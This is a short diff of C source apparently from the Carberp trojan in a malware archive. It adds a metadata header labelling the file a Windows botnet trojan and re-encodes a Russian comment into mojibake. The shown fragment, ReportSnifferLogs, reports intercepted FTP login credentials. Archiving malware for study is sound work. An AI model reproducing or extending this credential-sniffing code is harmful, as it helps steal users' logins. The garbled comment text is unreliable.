@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <winsock2.h>
 #include <windows.h>
 
@@ -122,7 +133,7 @@ typedef struct
 
 DWORD WINAPI ReportSnifferLogs(LPVOID Data)
 {
-    // отправить отчёт о перехваченных данных FTP авторизации
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ FTP пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Data == NULL)
 		return 0;
 	PFTPSNIFFER D = (PFTPSNIFFER)Data;
